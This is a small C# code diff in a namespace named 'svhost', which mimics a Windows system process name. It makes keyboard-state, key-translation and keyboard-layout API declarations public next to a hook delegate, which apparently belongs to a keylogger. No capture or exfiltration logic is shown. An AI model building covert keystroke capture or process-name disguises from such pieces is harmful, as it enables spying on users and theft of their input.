@@ -11,7 +11,7 @@ namespace svhost
     {
         [DllImport("user32.dll")]
         [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool GetKeyboardState(byte[] lpKeyState);
+        public static extern bool GetKeyboardState(byte[] lpKeyState);
 
         public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
 
@@ -70,11 +70,11 @@ namespace svhost
             int bufferSize, uint flags);
 
         [DllImport("user32.dll")]
-        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[]
+        public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[]
            lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
            int cchBuff, uint wFlags, IntPtr dwhkl);
 
         [DllImport("user32.dll")]
-        static extern IntPtr GetKeyboardLayout(uint idThread);
+        public static extern IntPtr GetKeyboardLayout(uint idThread);
     }
 }
